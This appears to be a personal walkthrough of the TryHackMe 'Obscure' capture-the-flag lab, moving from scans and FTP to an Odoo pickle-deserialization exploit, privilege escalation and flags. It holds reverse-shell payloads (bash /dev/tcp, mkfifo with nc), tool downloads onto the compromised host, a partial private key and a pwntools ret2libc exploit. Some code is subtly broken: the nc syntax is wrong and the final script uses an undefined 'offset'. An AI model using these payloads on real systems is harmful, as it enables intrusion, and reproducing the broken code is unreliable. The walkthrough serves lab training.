<h1>Obscure</h1>
<p>2025, August 16 - Day 467</p>
<img width="1882" height="372" alt="image" src="https://github.com/user-attachments/assets/4acb4ddb-c100-440a-aa18-22443196fcf9" />


<br>


<h3>Nmap</h3>

```bash
:~/Obscure# nmap -sC -sV -Pn -p- -T4  xx.xxx.xx.xx
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 65534    65534        4096 Jul 24  2022 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:xx.xxx.xx.xx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Werkzeug httpd 0.9.6 (Python 2.7.9)
| http-cookie-flags: 
|   /: 
|     session_id: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```


<h3>dirb</h3>

```bash
:~/Obscure# dirb http://xx.xxx.xx.xx

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Aug 16 xx:xx:xx 2025
URL_BASE: http://xx.xxx.xx.xx/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://xx.xxx.xx.xx/ ----
+ http://xx.xxx.xx.xx/logo (CODE:200|SIZE:13176)                                                                                      
+ http://xx.xxx.xx.xx/web (CODE:303|SIZE:227)                                                                                         
                                                                                                                                       
-----------------
END_TIME: Sat Aug 16 xx:xx:xx 2025
DOWNLOADED: 4612 - FOUND: 2
```

<br>


```bash
:~/Obscure# dirb http://xx.xxx.xx.xx/web/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Aug 16 xx:xx:xx 2025
URL_BASE: http://xx.xxx.xx.xx/web/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://xx.xxx.xx.xx/web/ ----
+ http://xx.xxx.xx.xx/web/login (CODE:200|SIZE:3141)                                                                                  
+ http://xx.xxx.xx.xx/web/report (CODE:302|SIZE:329)                                                                                  
+ http://xx.xxx.xx.xx/web/tests (CODE:302|SIZE:327)                                                                                   
                                                                                                                                       
-----------------
END_TIME: Sat Aug 16 22:00:46 2025
DOWNLOADED: 4612 - FOUND: 3
```

<br>
<h3>FTP</h3>

```bash
:~/Obscure# ftp xx.xxx.xx.xx
Connected to 10.201.114.50.
220 (vsFTPd 3.0.3)
Name (10.201.114.50:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Jul 24  2022 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             134 Jul 24  2022 notice.txt
-rwxr-xr-x    1 0        0            8856 Jul 22  2022 password
226 Directory send OK.
ftp> get notice.txt
local: notice.txt remote: notice.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notice.txt (134 bytes).
226 Transfer complete.
134 bytes received in 0.00 secs (1.4522 MB/s)
ftp> get password
local: password remote: password
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for password (8856 bytes).
226 Transfer complete.
8856 bytes received in 0.00 secs (61.6477 MB/s)
ftp> exit
221 Goodbye.
```

<br>

```bash
:~/Obscure# file notice.txt
notice.txt: ASCII text
:~/Obscure# cat notice.txt
From antisoft.thm security,


A number of people have been forgetting their passwords so we've made a temporary password application.
```

<br>

```bash
:~/Obscure# file password
password: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=97fe26005f73d7475722fa1ed61671e82aa481ff, not stripped
```

<br>

<p>

- SecurePaH<br>
- ssword12H<br>
- 971234596</p>

```bash
:~/Obscure# strings password
/lib64/ld-linux-x86-64.so.2
libc.so.6
__isoc99_scanf
puts
__stack_chk_fail
printf
strcmp
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-X
SecurePaH
ssword12H
AWAVA
AUATL
[]A\A]A^A_
971234596
remember this next time '%s'
Incorrect employee id
Password Recovery
Please enter your employee id that is in your email
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
crtstuff.c
...
```

<br>
<h3>Ghidra</h3>

<p>

- 971234596<br>
- SecurePassword123!</p>

<br>

<img width="1149" height="718" alt="image" src="https://github.com/user-attachments/assets/aeb09ea4-e626-46d2-a467-1aee3bf831da" />


<br>

<img width="786" height="100" alt="image" src="https://github.com/user-attachments/assets/1aae5542-f2b0-4cc0-a361-0fd991216f65" />


<br>

<p>

- SecurePassword123!

<br>

<br>

<h3>/web/login</h3>
<br>

<img width="1223" height="334" alt="image" src="https://github.com/user-attachments/assets/7f9f502b-2b5e-4853-bfae-8196fd9aed18" />


<br>
<br>


<img width="1078" height="699" alt="image" src="https://github.com/user-attachments/assets/a26bb5d3-860c-4af9-8634-76f4c2754fa4" />


<br>
<br>

<img width="1103" height="515" alt="image" src="https://github.com/user-attachments/assets/e6a2d138-336f-43d3-91fc-c3cb264def24" />


<br>
<br>
<br>
<br>

<img width="1223" height="334" alt="image" src="https://github.com/user-attachments/assets/7f9f502b-2b5e-4853-bfae-8196fd9aed18" />

<br>
<br>

<br>
<h3>Exploit</h3>

```bash
:~/Obscure# searchsploit Odoo 10.0
------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                        |  Path
------------------------------------------------------------------------------------------------------ ---------------------------------
Odoo CRM 10.0 - Code Execution                                                                        | linux/local/44064.md
------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
:~/Obscure# searchsploit -m 44064.md
  Exploit: Odoo CRM 10.0 - Code Execution
      URL: https://www.exploit-db.com/exploits/44064
     Path: /opt/exploitdb/exploits/linux/local/44064.md
    Codes: CVE-2017-10803
```

<p>or</p>

```bash
https://www.exploit-db.com/exploits/44064
```

<br>
<br>

```bash
:~/Obscure# cat exploit.py
import cPickle
import os
import base64
import pickletools

class Exploit(object):
  def __reduce__(self):
    return (os.system, (("bash -i >& /dev/tcp/xx.xxx.xx.xxx/4444 0>&1"),))

with open("exploit.pickle", "wb") as f:
  cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```



```bash
import cPickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, (("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.201.11.142/4444 >/tmp/f"),))

with open("exploit.pickle", "wb") as f:
    cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```

<br>
<br>


<p>

- click <code>Settings</code><br>
- click x to remove Apps from the Search field<br>
- search for <code>database</code><br>
- click <code>Install</code> in  <code>Database Anonymization</code><br>
- refresh<br>
- click <code>Settings</code><br>
- click <code>Anonymize database</code><br>
- click <code>Anonymize Database</code><br>
- you should get a message: Anonymization successful.<br>Donot forget to save the resulting file to a safe place because you will not be able to revert the anonymization without this file.<br>This file is also stored in the /var/lib/odoo directory. The absolute file path is: /var/lib/odoo/field_anonymization_main_1.pickle.<br>
- clicked <code>Save><br>

Anonymization successful.

Donot forget to save the resulting file to a safe place because you will not be able to revert the anonymization without this file.

This file is also stored in the /var/lib/odoo directory. The absolute file path is: /var/lib/odoo/field_anonymization_main_1.pickle.

- refresh<br>
- click <code>Anonymize Database</code><br>
- click <code>Upload your file</code><br>
- click Open
- 
- set up a listener in the same port considered in the payload<br>
- click <code>Reverse the Database Anonymization</code></p>

<br>
<br>

<img width="1258" height="293" alt="image" src="https://github.com/user-attachments/assets/7ed75da0-da88-4e4c-9109-aff94514e5ff" />


<img width="1232" height="332" alt="image" src="https://github.com/user-attachments/assets/cf5734a4-0c99-4220-8cf4-c5cfd52da6c4" />

<br>
<br>

<img width="1229" height="425" alt="image" src="https://github.com/user-attachments/assets/54e2784e-1bdd-4dcb-8594-7b40b93e129a" />

<br>
<br>

<img width="1239" height="420" alt="image" src="https://github.com/user-attachments/assets/c59928fc-b390-4c56-b8ba-940e41e699ea" />


<br>
<br>

<img width="678" height="510" alt="image" src="https://github.com/user-attachments/assets/09dfcb23-457d-43ab-8794-fd96cf7a4418" />

<br>
<br>

<img width="676" height="511" alt="image" src="https://github.com/user-attachments/assets/5c4110b2-1d36-4923-92c1-776515b1f8ef" />

<br>
<br>


<img width="672" height="509" alt="image" src="https://github.com/user-attachments/assets/bcf23a24-9c74-466e-9a3b-453e319ce941" />

<br>
<br>

<img width="680" height="453" alt="image" src="https://github.com/user-attachments/assets/84a7db0a-3868-41c4-a073-3724655b62ed" />

<br>
<br>

<img width="679" height="473" alt="image" src="https://github.com/user-attachments/assets/7eadf4e3-1fb1-491e-9682-3791c89c0fba" />

<br>
<br>


<img width="1255" height="623" alt="image" src="https://github.com/user-attachments/assets/1bbe92c7-f719-4ba5-aade-bfc0e35a0b01" />

<br>
<br>

<img width="1246" height="204" alt="image" src="https://github.com/user-attachments/assets/95632dfd-e8e4-40de-9c37-400288fd0f53" />

<br>
<br>

<img width="1252" height="399" alt="image" src="https://github.com/user-attachments/assets/036604b2-95c2-400e-90df-a69ed3842018" />




<img width="664" height="393" alt="image" src="https://github.com/user-attachments/assets/38722396-06bc-4c28-ace4-a96da5147d2a" />



root@ip-10-201-47-153:~/Obscure# nano exploit.py
root@ip-10-201-47-153:~/Obscure# nano exploit.py
root@ip-10-201-47-153:~/Obscure# nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.201.4.52 42798
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
odoo@b8a9bbf1f380:/$ SHELL=/bin/bash script -q /dev/null
SHELL=/bin/bash script -q /dev/null
odoo@b8a9bbf1f380:/$ 




<br>
<br>

```bash
SHELL=/bin/bash script -q /dev/null
```

<br>

```bash
odoo@b8a9bbf1f380:/$ cd /var/lib/odoo

odoo@b8a9bbf1f380:~$ ls -a
ls -a
.   .bash_history  field_anonymization_main_1.pickle  flag.txt
..  addons	   filestore			      sessions
odoo@b8a9bbf1f380:~$ 



odoo@b8a9bbf1f380:~$ ls
addons
field_anonymization_main_1.pickle
filestore
flag.txt
sessions
odoo@b8a9bbf1f380:~$ cat flag.txt
THM{1243b64a3a01a8732ccb96217f593520}



getcap -r / 2>/dev/null



odoo@b8a9bbf1f380:~$ find / -perm -u=s f 2>/dev/null
/bin/mount
/bin/umount
/bin/ping
/bin/ping6
/bin/su
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/ret
```


odoo@b8a9bbf1f380:/tmp$ find / -perm -4000 -ls 2>/dev/null
find / -perm -4000 -ls 2>/dev/null
156001   40 -rwsr-xr-x   1 root     root        40000 Mar 29  2015 /bin/mount
156039   28 -rwsr-xr-x   1 root     root        27416 Mar 29  2015 /bin/umount
156006   44 -rwsr-xr-x   1 root     root        44104 Nov  8  2014 /bin/ping
156007   44 -rwsr-xr-x   1 root     root        44552 Nov  8  2014 /bin/ping6
156022   40 -rwsr-xr-x   1 root     root        40168 May 17  2017 /bin/su
142767  456 -rwsr-xr-x   1 root     root       464904 Mar 25  2019 /usr/lib/openssh/ssh-keysign
156958   40 -rwsr-xr-x   1 root     root        39912 May 17  2017 /usr/bin/newgrp
156863   44 -rwsr-xr-x   1 root     root        44464 May 17  2017 /usr/bin/chsh
156861   56 -rwsr-xr-x   1 root     root        53616 May 17  2017 /usr/bin/chfn
156909   76 -rwsr-xr-x   1 root     root        75376 May 17  2017 /usr/bin/gpasswd
156970   56 -rwsr-xr-x   1 root     root        54192 May 17  2017 /usr/bin/passwd
 10150   12 -rwsr-xr-x   1 root     root         8864 Jul 23  2022 /ret


<br>

```bash
odoo@b8a9bbf1f380:/$ ls -lah
total 88K
drwxr-xr-x   1 root root 4.0K Jul 26  2022 .
drwxr-xr-x   1 root root 4.0K Jul 26  2022 ..
-rwxr-xr-x   1 root root    0 Jul 23  2022 .dockerenv
drwxr-xr-x   1 root root 4.0K Jul 23  2022 bin
drwxr-xr-x   2 root root 4.0K Jun 14  2018 boot
drwxr-xr-x   5 root root  340 Aug 16 20:18 dev
-rwxrwxr-x   1 root root 1.1K Oct 17  2019 entrypoint.sh
drwxr-xr-x   1 root root 4.0K Jul 23  2022 etc
drwxr-xr-x   2 root root 4.0K Jun 14  2018 home
drwxr-xr-x   1 root root 4.0K Oct 17  2019 lib
drwxr-xr-x   2 root root 4.0K Oct 14  2019 lib64
drwxr-xr-x   2 root root 4.0K Oct 14  2019 media
drwxr-xr-x   1 root root 4.0K Oct 17  2019 mnt
drwxr-xr-x   2 root root 4.0K Oct 14  2019 opt
dr-xr-xr-x 134 root root    0 Aug 16 20:18 proc
-rwsr-xr-x   1 root root 8.7K Jul 23  2022 ret
drwx------   1 root root 4.0K Jul 23  2022 root
drwxr-xr-x   1 root root 4.0K Oct 17  2019 run
drwxr-xr-x   1 root root 4.0K Oct 17  2019 sbin
drwxr-xr-x   2 root root 4.0K Oct 14  2019 srv
dr-xr-xr-x  13 root root    0 Aug 16 20:18 sys
drwxrwxrwt   1 root root 4.0K Aug 16 22:03 tmp
drwxr-xr-x   1 root root 4.0K Oct 14  2019 usr
drwxr-xr-x   1 root root 4.0K Oct 14  2019 var
```

<br>
<br>
<br>
<br>


```bash
:~/Obscure# cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAxuNhK456dD+WXwoMLkfzQPvBsbnN27Aq8NfCVp4625XyoXi+
...
zEZCM96+u7ztQ4SbQdQyoxvvlHT/ndXx6XGJZLumWNjo0yLWHrt4oEBdXXyKnsoc
Xd7vdmN3yLBxPy/oLniacvcYUPsXwhLOGkumAgPPevzJsn+MHvxm5JQ6U0/MrM3S
aR/dJVG0ySki5Gtv/7YLW8kCgYEAhKCtLe684OcOI/g830rDwgHW6oXiDyKsxtHR
/13rJbeBIitWlmz5D3z9mvqRIbhc8IA8SCfYiRKz1WHxNjRJukdc0FDeLsjtPFqd
oudjDNXGitbgEHFzeQg+7slgOtDLQs0Wn0daumcfctB7oiJX5fMyHvj43Fl7/64K
PAHY6rkCgYEAsVk6DjjzRQCAMoyC9H4bwAWMkvYerSkmvIo3efCMyUdKtMjg3cCv
EFmGDkEL3l6/2W3bmF6kbYDOeSyRjAaZp59QUiNliiHneD9VwCVXT/IF70O+kNkf
c7FgDFMEoa44S7BZIhxymHyGN7xgPQ6EJonUuMCfmP83KLRZrkI4FPI=
-----END RSA PRIVATE KEY-----
```

<br>

```bash
:~/Obscure#  chmod 600 id_rsa
```

<br>



odoo@b8a9bbf1f380:/tmp$ getent hosts
getent hosts
127.0.0.1       localhost
127.0.0.1       localhost ip6-localhost ip6-loopback
172.17.0.2      db b5cc3d65e489 unkkuri-db
172.17.0.3      b8a9bbf1f380


odoo@b8a9bbf1f380:/tmp$ ss
ss
Netid  State      Recv-Q Send-Q   Local Address:Port       Peer Address:Port   
tcp    ESTAB      0      0           172.17.0.3:60994        172.17.0.2:postgresql 
tcp    ESTAB      0      0           172.17.0.3:60990        172.17.0.2:postgresql 
tcp    ESTAB      0      0           172.17.0.3:60992        172.17.0.2:postgresql 
tcp    ESTAB      0      0           172.17.0.3:42798     10.201.47.153:1234    
tcp    ESTAB      0      0           172.17.0.3:8069      10.201.47.153:35918   
tcp    ESTAB      0      0           172.17.0.3:60986        172.17.0.2:postgresql 





odoo@b8a9bbf1f380:/tmp$ curl http://10.201.47.153:8000/nmap-x64.tar.gz -o nmap-x64.tar.gz
<l http://10.201.47.153:8000/nmap-x64.tar.gz -o nmap-x64.tar.gz              
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10.1M  100 10.1M    0     0   105M      0 --:--:-- --:--:-- --:--:--  106M
odoo@b8a9bbf1f380:/tmp$ 



odoo@b8a9bbf1f380:/tmp$ tar -xzf nmap-x64.tar.gz
tar -xzf nmap-x64.tar.gz
odoo@b8a9bbf1f380:/tmp$ 


<p> 172.17.0.1 has port 4444 open</p>

odoo@b8a9bbf1f380:/tmp$ ./nmap -Pn 172.17.0/24







```bash
:~/Obscure# ssh -i id_rsa zeeshan@xx.xxx.xxx.xxx
```

<br>
<br>

<img width="1212" height="605" alt="image" src="https://github.com/user-attachments/assets/5fd6b9af-dc24-43f3-83ee-8d807440c7ec" />

<br>
<br>

```bash
zeeshan@hydra:~$ pwd
/home/zeeshan
```

<br>

```bash
zeeshan@hydra:~$ cat user.txt
THM{43b0b68ba2755dd6cac3b8bf5454db94}
```

<br>
<br>

```bash
zeeshan@hydra:~$ netstat -tunlp
...
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 172.17.0.1:4444         0.0.0.0:*               LISTEN      1797/socat      
tcp        0      0 127.0.0.1:36768         0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::21                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -          
```

<br>

<br>

<h3>zeeshan´s privileges</h3>

```bash
zeeshan@hydra:~$ sudo -l
Matching Defaults entries for zeeshan on hydra:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User zeeshan may run the following commands on hydra:
    (ALL : ALL) ALL
    (root) NOPASSWD: /exploit_me
```

<br>

<br>
<br>
<h3>ret</h3><br>

<br>
<br>


```bash
:~/Obscure# curl http://xx.xxx.xxx.xxx:8000/ret -o ret
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  8864  100  8864    0     0  4328k      0 --:--:-- --:--:-- --:--:-- 4328k
```

<br>


```bash
zeeshan@hydra:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...
xx.xxx.xx.xxx - - [17/Aug/2025 xx:xx:xx] "GET /ret HTTP/1.1" 200 -
```

<br>

```bash
:~/Obscure# chmod 777 ret
```

<br>

```bash
:~/Obscure# file ret
ret: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3c3a9e9f974de13925f0644178007bdbf22576e3, not stripped
```

<br>
<h3>Ghidra</h3>

<br>
<br>

<img width="636" height="473" alt="image" src="https://github.com/user-attachments/assets/95d7cc23-1e68-4379-a5a1-58a8f0e9a550" />


<br>
<br>
<br>
<h3>exploit_me</h3>

```bash
zeeshan@hydra:/$ ls
bin   dev  exploit_me  initrd.img      lib    lost+found  mnt  proc  run   snap  sys  usr  vmlinuz
boot  etc  home        initrd.img.old  lib64  media       opt  root  sbin  srv   tmp  var  vmlinuz.old
```

<br>

```bash
:~/Obscure# curl http://xx.xxx.xxx.xxx:8000/exploit_me -o exploit_me
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  8712  100  8712    0     0  2835k      0 --:--:-- --:--:-- --:--:-- 2835k
```

<br>


```bash
:~/Obscure# chmod 777 exploit_me
```

<br>
<br>
<h4>Ghidra</h4>

<br>

<img width="1293" height="738" alt="image" src="https://github.com/user-attachments/assets/d1aa2118-7527-4fc4-9135-67bffebdff1d" />

<br>
<br>


```bash
undefined8 main(void)

{
  char local_28 [32];
  
  setuid(0);
  puts("Exploit this binary for root!");
  gets(local_28);
  return 0;
}
```




<br>

```bash
:~/Obscure# ldd exploit_me
	linux-vdso.so.1 (0x00007ffc7a3bc000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd1a5b90000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fd1a5da1000)
```

<br>


```bash
:~/Obscure# cp /lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
```

<br>

```bash
:~/Obscure# # ldd exploit_me
	linux-vdso.so.1 (0x00007ffcb2ab1000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6b64dea000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f6b64ffb000)
```




<p><em>https://0xrodon.medium.com/tryhackme-obscure-walkthrough-obscure-ctf-e2eb82ff5245</em></p>

```bash
:~/Obscure# cat exploit.py
#!/usr/bin/python
from pwn import *

elf = context.binary = ELF('./exploit_me', checksec=False)
libc = elf.libc

# Connect via SSH using the private key for authentication
s = ssh(host='10.201.124.236', user='zeeshan', keyfile='id_rsa')

# Run the binary on the remote host
p = s.run('./exploit_me')

# Prepare the payload
prefix = b"a" * 40
pop_rdi = p64(next(elf.search(asm("pop rdi; ret"))))
go_gets = p64(elf.got.gets)
go_puts = p64(elf.got.puts)
fn_puts = p64(elf.plt.puts)
fn_main = p64(elf.symbols.main)

payload = (prefix + pop_rdi + go_gets + fn_puts +
pop_rdi + go_puts + fn_puts +
fn_main)

# Send the payload and receive the response
p.clean()
p.sendline(payload)

# Read addresses from the response
gets_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
print('Gets :'  + hex(gets_addr)[-5:])
print('Puts :'  + hex(puts_addr)[-5:])

# Calculate the addresses for system and /bin/sh
libc_base = gets_addr - 0x6ed90 # address found on libc.rip after first execution
bin_sh = p64(offset + 0x18ce57) # address of /bin/sh
system = p64(offset + 0x453a0) # address of system

# Prepare the final payload
payload = prefix + pop_rdi + bin_sh + system

# Send the final payload
p.clean()
p.sendline(payload)

# Interact with the shell
p.interactive()
```

<br>
<br>

